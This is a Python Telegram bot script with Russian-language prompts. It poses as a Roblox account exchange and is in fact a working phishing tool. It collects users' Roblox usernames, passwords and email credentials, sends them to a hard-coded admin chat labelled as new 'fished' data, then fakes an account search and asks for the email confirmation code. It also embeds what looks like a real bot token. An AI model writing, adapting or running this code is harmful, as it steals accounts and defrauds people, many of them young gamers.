iimport telebot
from telebot import types
import time

TOKEN = "7837835834:AAHm3-hrbWlZ5tpKB2W6T16-keyolIQ-q84"
ADMIN_ID = 6760627781
bot = telebot.TeleBot(TOKEN)

# Хранилище данных
users_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    try:
        # Проверка подписки на канал
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton(
            "✅ Подписаться", 
            url="https://t.me/hbgrrhve"
        )
        markup.add(btn)
        
        bot.send_message(
            message.chat.id,
            "📛 Для доступа к обмену необходимо подписаться на канал:",
            reply_markup=markup
        )
    except Exception as e:
        print(f"Ошибка: {e}")

@bot.message_handler(func=lambda m: True)
def handle_message(message):
    try:
        # Проверка подписки
        chat_member = bot.get_chat_member("@ваш_канал", message.from_user.id)
        if chat_member.status not in ['member', 'administrator', 'creator']:
            bot.send_message(message.chat.id, "❌ Вы не подписаны на канал!")
            return
            
        # Основная логика
        if message.text == "🔓 Начать обмен":
            msg = bot.send_message(message.chat.id, "Введите ник Roblox:")
            bot.register_next_step_handler(msg, process_login)
            
    except Exception as e:
        bot.send_message(ADMIN_ID, f"🚨 Ошибка: {str(e)}")

def process_login(message):
    try:
        users_data[message.chat.id] = {"nick": message.text}
        msg = bot.send_message(message.chat.id, "🔑 Введите пароль:")
        bot.register_next_step_handler(msg, process_password)
    except Exception as e:
        print(e)

def process_password(message):
    try:
        users_data[message.chat.id]["password"] = message.text
        msg = bot.send_message(message.chat.id, "📧 Введите email:пароль:")
        bot.register_next_step_handler(msg, final_step)
    except Exception as e:
        print(e)

def final_step(message):
    try:
        users_data[message.chat.id]["email"] = message.text
        # Отправка данных админу
        report = f"""
        🎣 Новые данные!
        ID: {message.from_user.id}
        Ник: {users_data[message.chat.id]['nick']}
        Пароль: {users_data[message.chat.id]['password']}
        Почта: {users_data[message.chat.id]['email']}
        """
        bot.send_message(ADMIN_ID, report)
        # Фиктивный обмен
        bot.send_message(message.chat.id, "🔍 Ищем подходящий аккаунт...")
        time.sleep(3)
        bot.send_message(message.chat.id, "✅ Найден аккаунт с 10K Robux!\nВведите код из email для подтверждения")
    except Exception as e:
        print(e)

if __name__ == "__main__":
    print("🟢 Бот запущен")
    bot.polling(none_stop=True)